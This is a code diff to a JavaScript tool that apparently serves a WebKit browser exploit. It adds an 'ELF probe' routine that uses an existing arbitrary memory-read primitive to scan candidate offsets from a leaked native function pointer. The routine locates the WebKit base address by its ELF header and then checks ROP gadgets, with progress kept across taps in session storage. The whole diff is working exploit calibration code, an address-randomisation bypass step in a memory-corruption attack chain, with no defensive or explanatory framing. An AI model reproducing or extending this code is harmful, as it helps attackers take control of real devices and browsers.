@@ -93,7 +93,7 @@ function wireGroomBar() {
 }
 
 let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In;
-let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnVerify2, btnSetExpm12, btnCopy, btnClear;
+let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnVerify2, btnSetExpm12, btnProbe, btnCopy, btnClear;
 let calBarEl;
 let scanMode = "lite";
 let scanIndex = 0;
@@ -141,6 +141,7 @@ function setUi() {
     setCalButton(btnSetExpm1, calReady);
     setCalButton(btnVerify2, calReady);
     setCalButton(btnSetExpm12, calReady);
+    setCalButton(btnProbe, calReady);
     if (btnCopy) btnCopy.disabled = busy || !calibrated;
     if (expm1In) expm1In.disabled = busy || !(ready && nativeFn);
     if (calBarEl) {
@@ -174,6 +175,34 @@ function clearLkProgress() {
         sessionStorage.removeItem(SS_LK_ERROR);
         sessionStorage.removeItem(SS_LK_W0);
     } catch (_) { }
+}
+
+const SS_PROBE_I = "wk-cal-probe-i";
+const SS_PROBE_LIST = "wk-cal-probe-n";
+
+function ptrNum(fn) {
+    return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
+}
+
+function ptrFromNum(n) {
+    if (!(n >= 0)) return null;
+    return new int64(n >>> 0, Math.floor(n / 0x100000000));
+}
+
+function ptrResidue(fn) {
+    return ptrNum(fn) & (CAL_ALIGN_STEP - 1);
+}
+
+function baseFromDelta(fn, delta) {
+    if (!fn || !(delta > 0)) return null;
+    const n = ptrNum(fn) - delta;
+    if (n <= 0) return null;
+    return ptrFromNum(n);
+}
+
+function fmtMagic(m) {
+    if (m == null) return "read-failed";
+    return "0x" + (m >>> 0).toString(16);
 }
 
 function activeDelta() {
@@ -218,7 +247,7 @@ function liteHintDeltas(off, fn) {
     const hint = off.wk_expm1_builtin;
     if (hint == null) return [];
     const k = liteSpanK();
-    const residue = fn.low & (CAL_ALIGN_STEP - 1);
+    const residue = ptrResidue(fn);
     const out = [];
     for (let i = -k; i <= k; i++) {
         const d = (hint + i * CAL_ALIGN_STEP) >>> 0;
@@ -227,10 +256,10 @@ function liteHintDeltas(off, fn) {
     return out;
 }
 
-function wideAlignedDeltas(fn) {
-    const minD = parseInt(params.get("min") || "0x2570000", 16);
-    const maxD = parseInt(params.get("max") || "0x25a0000", 16);
-    const residue = fn.low & (CAL_ALIGN_STEP - 1);
+function probeAlignedDeltas(fn) {
+    const minD = parseInt(params.get("min") || "0x2200000", 16);
+    const maxD = parseInt(params.get("max") || "0x2800000", 16);
+    const residue = ptrResidue(fn);
     const out = [];
     let d = (minD & ~(CAL_ALIGN_STEP - 1)) | residue;
     if (d < minD) d += CAL_ALIGN_STEP;
@@ -239,6 +268,10 @@ function wideAlignedDeltas(fn) {
         d += CAL_ALIGN_STEP;
     }
     return out;
+}
+
+function wideAlignedDeltas(fn) {
+    return probeAlignedDeltas(fn);
 }
 
 function liteSpanK() {
@@ -261,7 +294,7 @@ function captureNativeFn(p, off) {
 function suggestedExpm1(fn, off) {
     const hint = off && off.wk_expm1_builtin;
     if (!fn || hint == null) return 0;
-    const residue = fn.low & (CAL_ALIGN_STEP - 1);
+    const residue = ptrResidue(fn);
     for (let ki = 0; ki < 7; ki++) {
         const k = [-1, 0, 1, -2, 2, -3, 3][ki];
         const d = (hint + k * CAL_ALIGN_STEP) >>> 0;
@@ -274,16 +307,16 @@ function prefillSuggestedExpm1(fn, off) {
     const guess = suggestedExpm1(fn, off);
     if (!(guess > 0)) return 0;
     if (expm1In) expm1In.value = guess.toString(16);
-    mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + fn.sub32(guess)
-        + " — tap Set expm1 (0 reads, skip scan)");
+    mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + baseFromDelta(fn, guess)
+        + " (guess only — use Probe ELF if verify fails)");
     updateResultPanel();
     return guess;
 }
 
 function tryElfOnce(p, fn, delta) {
     if (!(delta > 0)) return null;
-    const base = fn.sub32(delta);
-    if (!alignedWebkitBase(base)) return null;
+    const base = baseFromDelta(fn, delta);
+    if (!base || !alignedWebkitBase(base)) return null;
     const magic = read4p(p, base);
     if (magic !== ELF_MAGIC) return null;
     return { delta, base };
@@ -300,7 +333,7 @@ function updateResultPanel() {
         if (calibrated && calibrated.webkitBase)
             baseEl.textContent = String(calibrated.webkitBase);
         else if (nativeFn && expm1In && expm1In.value.trim())
-            baseEl.textContent = String(nativeFn.sub32(parseExpm1(expm1In.value)));
+            baseEl.textContent = String(baseFromDelta(nativeFn, parseExpm1(expm1In.value)));
         else
             baseEl.textContent = "—";
     }
@@ -395,16 +428,17 @@ function rebuildScanList(mode) {
 }
 
 function logNativeFnInfo(fn) {
-    const residue = fn.low & (CAL_ALIGN_STEP - 1);
-    mark("CAL-NATIVEFN", String(fn));
-    mark("CAL-RESIDUE", "low&0x3fff=0x" + residue.toString(16)
-        + " (delta must match this nibble)");
+    const residue = ptrResidue(fn);
+    mark("CAL-NATIVEFN", String(fn) + " (ptr=0x" + ptrNum(fn).toString(16) + ")");
+    mark("CAL-RESIDUE", "ptr&0x3fff=0x" + residue.toString(16));
     mark("CAL-FORMULA", "webkitBase = nativeFn - expm1");
+    const code0 = window.p ? read4p(window.p, fn) : null;
+    mark("CAL-CODE0", "read4@nativeFn=" + fmtMagic(code0) + " (sanity — not ELF)");
     if (tableOff && tableOff.wk_expm1_builtin != null) {
         const hint = tableOff.wk_expm1_builtin;
-        const hintBase = fn.sub32(hint);
+        const hintBase = baseFromDelta(fn, hint);
         mark("CAL-HINT", "table expm1=0x" + hint.toString(16)
-            + " → base=" + hintBase + (alignedWebkitBase(hintBase) ? "" : " (misaligned)"));
+            + " → base=" + hintBase + (hintBase && alignedWebkitBase(hintBase) ? "" : " (misaligned)"));
     }
 }
 
@@ -496,6 +530,8 @@ async function runStart() {
         try {
             sessionStorage.removeItem("wk-cal-lite-i");
             sessionStorage.removeItem("wk-cal-wide-i");
+            sessionStorage.removeItem(SS_PROBE_I);
+            sessionStorage.removeItem(SS_PROBE_LIST);
         } catch (_) { }
 
         ready = true;
@@ -588,12 +624,77 @@ function runSetExpm1() {
         return;
     }
     const base = nativeFn.sub32(delta);
+    const base2 = baseFromDelta(nativeFn, delta);
     try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
     clearVerifyProgress();
     updateResultPanel();
-    mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base + " (0 reads)");
-    mark("HINT", "optional: Verify step confirms ELF+gadgets (1 read/tap)");
-    state("expm1 set (0 reads) — Verify step optional", "ok");
+    mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base2 + " (0 reads)");
+    if (base2 && base && (base2.low !== base.low || base2.hi !== base.hi))
+        mark("CAL-NOTE", "sub32 base=" + base + " ptr base=" + base2);
+    mark("HINT", "tap Probe ELF if Verify step 1 fails on this delta");
+    state("expm1 set (0 reads)", "ok");
+}
+
+async function runProbeElf() {
+    if (busy || !ready || !window.p || !nativeFn) return;
+    busy = true;
+    setUi();
+    preCalTrim();
+
+    let list = [];
+    try {
+        const n = parseInt(sessionStorage.getItem(SS_PROBE_LIST) || "0", 10) || 0;
+        if (n > 0) list = probeAlignedDeltas(nativeFn).slice(0, n);
+    } catch (_) { }
+    if (list.length === 0) {
+        list = probeAlignedDeltas(nativeFn);
+        try { sessionStorage.setItem(SS_PROBE_LIST, String(list.length)); } catch (_) { }
+    }
+
+    let i = 0;
+    try { i = parseInt(sessionStorage.getItem(SS_PROBE_I) || "0", 10) || 0; } catch (_) { }
+
+    if (i >= list.length) {
+        mark("CAL-FAIL", "probe exhausted " + list.length + " aligned deltas");
+        mark("HINT", "2582880 may be wrong for 13.52 — try ?min=0x2000000&max=0x2a00000");
+        state("probe done — no ELF", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
+
+    const delta = list[i];
+    const base = baseFromDelta(nativeFn, delta);
+    mark("PROBE-TRY", (i + 1) + "/" + list.length + " expm1=0x" + delta.toString(16)
+        + " base=" + base + " (1 read)");
+
+    try {
+        await new Promise(r => setTimeout(r, 64));
+        const magic = read4p(window.p, base);
+        i++;
+        try { sessionStorage.setItem(SS_PROBE_I, String(i)); } catch (_) { }
+
+        if (magic !== ELF_MAGIC) {
+            mark("ELF-MISS", fmtMagic(magic) + " @ " + base);
+            state("probe " + i + "/" + list.length + " — tap Probe ELF again", "warn");
+            return;
+        }
+
+        try {
+            sessionStorage.removeItem(SS_PROBE_I);
+            sessionStorage.removeItem(SS_PROBE_LIST);
+        } catch (_) { }
+        if (expm1In) expm1In.value = delta.toString(16);
+        try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
+        clearVerifyProgress();
+        updateResultPanel();
+        mark("CAL-ELF-HIT", "expm1=0x" + delta.toString(16) + " base=" + base);
+        mark("NEXT", "tap Set expm1 then Verify step from step 2");
+        state("ELF found — Set expm1 + Verify step", "ok");
+    } finally {
+        busy = false;
+        setUi();
+    }
 }
 
 async function runVerifyStep() {
@@ -610,7 +711,14 @@ async function runVerifyStep() {
     preCalTrim();
 
     const p = window.p;
-    const base = nativeFn.sub32(delta);
+    const base = baseFromDelta(nativeFn, delta);
+    if (!base) {
+        mark("CAL-FAIL", "bad base for expm1=0x" + delta.toString(16));
+        state("bad expm1", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
     let step = 0;
     try { step = parseInt(sessionStorage.getItem(SS_VSTEP) || "0", 10) || 0; } catch (_) { }
     try { verifyGadgetOk = parseInt(sessionStorage.getItem(SS_VGAD_OK) || "0", 10) || 0; } catch (_) { }
@@ -626,8 +734,13 @@ async function runVerifyStep() {
             const magic = read4p(p, base);
             if (magic !== ELF_MAGIC) {
                 clearVerifyProgress();
-                mark("CAL-FAIL", "ELF bad @ base=" + base);
-                state("ELF verify failed", "bad");
+                mark("CAL-FAIL", "ELF @ base=" + base + " got=" + fmtMagic(magic)
+                    + " want=0x464c457f");
+                mark("HINT", "2582880 is a guess — tap 2c. Probe ELF (1 read/tap) to hunt real expm1");
+                const atGuess = read4p(p, baseFromDelta(nativeFn, suggestedExpm1(nativeFn, tableOff)));
+                if (atGuess != null)
+                    mark("HINT", "table-hint base got=" + fmtMagic(atGuess));
+                state("ELF fail — use Probe ELF", "bad");
                 return;
             }
             mark("CAL-ELF-OK", "base=" + base);
@@ -785,6 +898,7 @@ function init() {
     btnSetExpm1 = $("btn-set-expm1");
     btnVerify2 = $("btn-verify-2");
     btnSetExpm12 = $("btn-set-expm1-2");
+    btnProbe = $("btn-probe");
     calBarEl = $("cal-bar");
     btnCopy = $("btn-copy");
     btnClear = $("btn-clear");
@@ -801,6 +915,7 @@ function init() {
     wireClick(btnVerify2, function () { return runVerifyStep(); });
     wireClick(btnSetExpm1, runSetExpm1);
     wireClick(btnSetExpm12, runSetExpm1);
+    wireClick(btnProbe, function () { return runProbeElf(); });
     wireClick(btnCopy, runCopy);
     wireClick(btnClear, function () {
         lines.length = 0;
